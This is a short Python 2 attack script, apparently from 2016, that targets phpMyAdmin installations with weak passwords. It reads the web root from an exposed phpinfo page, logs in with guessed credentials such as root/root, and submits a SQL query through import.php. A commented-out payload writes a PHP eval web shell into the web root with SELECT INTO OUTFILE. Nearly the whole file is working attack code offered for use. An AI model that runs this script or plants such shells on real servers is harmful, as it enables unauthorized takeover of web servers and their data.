# -*-coding:utf8-*-
# phpmyadmin weak password getshell #
# author: Nan3r 					#
# date:2016.6.30					#
import sys
reload(sys)
sys.setdefaultencoding("utf-8")

import requests,random
import re
def getwebpath(url):
	htmltext = gethtml(url).text
	#print htmltext
	#这里使用match为什么不能匹配到
	m = re.findall(r'<tr><td class="e">DOCUMENT_ROOT </td><td class="v">(.*?)</td></tr>', htmltext, re.S)
	return m[0].strip()
	pass

#get html status					#
def gethtml(url):
	res = requests.get(url)
	return res
	pass

#get web path						#
def getpath(url):
	htmltext = gethtml(url+'/phpinfo.php').text
	#print htmltext
	#这里使用match为什么不能匹配到
	m = re.findall(r'<tr><td class="e">DOCUMENT_ROOT </td><td class="v">(.*?)</td></tr>', htmltext, re.S)
	return m[0].strip()+'/'+str(random.randint(100, 200))+'.php'
	pass

#login phpmyadmin					#
def login_getshell(url, name, pwd, payload):
	htmltext = gethtml(url+'/phpmyadmin/index.php').text
	m = re.findall(r'<input type="hidden" name="token" value="(.*?)" />', htmltext, re.S)
	postdata = {'pma_username':name,
				'pma_password':pwd,
				'serve':'1',
				'token':m[0]
				}
	posttext = requests.post(url+'/phpmyadmin/index.php', data=postdata, allow_redirects=True)
	_cookies =  posttext.cookies
	print len(_cookies)
	shell = {'is_js_confirmed':'0',
			 'token':m[0],
			 'pos':'0',
			 'goto':'server_sql.php',
			 'message_to_show':'%E6 %82%A8%E7%9A%84+SQL+%E8%AF%AD%E5%8F%A5%E5%B7%B2%E6%88%90%E5%8A%9F%E8%BF%90%E8%A1%8C',
			 'prev_sql_query':'',
			 'sql_query':payload,
			 'sql_delimiter':'%3B',
			 'show_query':'1',
			 'ajax_request':'true',

			 }
	getshell = requests.post(url+'/phpmyadmin/import.php', cookies=_cookies, data=shell, allow_redirects=True)
	print str(getshell.status_code)+'shell: '+payload
	pass


if __name__ == '__main__':
	# url = 'http://10.15.46.140'
	# name = 'root'
	# pwd = 'root'
	# webpath = getpath(url)
	#payload = "select+'<?php @eval($_POST[a]);?>'+into+outfile+'"+webpath+"'"

	#login_getshell(url, name, pwd, payload)
	url = sys.argv[1]
	print getwebpath(url)

	
	